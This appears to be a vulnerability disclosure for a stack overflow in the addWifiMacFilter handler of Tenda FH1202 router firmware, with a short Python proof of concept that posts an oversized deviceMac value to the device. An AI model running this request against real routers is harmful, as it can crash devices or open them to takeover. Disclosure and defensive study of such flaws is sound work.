## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2079.html

## Affected version

FH1202 V1.2.0.14(408)

## Vulnerability details

The Tenda FH1202 V1.2.0.14(408) has a stack overflow vulnerability in the `addWifiMacFilter` function. The `v4` variable receives the `deviceMac` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `v4` can trigger this security vulnerability.

![image-20240319224933815](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319224933815.png)

![image-20240319224915736](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319224915736.png)

![image-20240319224924004](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319224924004.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/addWifiMacFilter"
payload = b"a"*1000

data = {"deviceMac": payload, "deviceId":1}
response = requests.post(url, data=data)
print(response.text)
```

![](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240319224841939.png)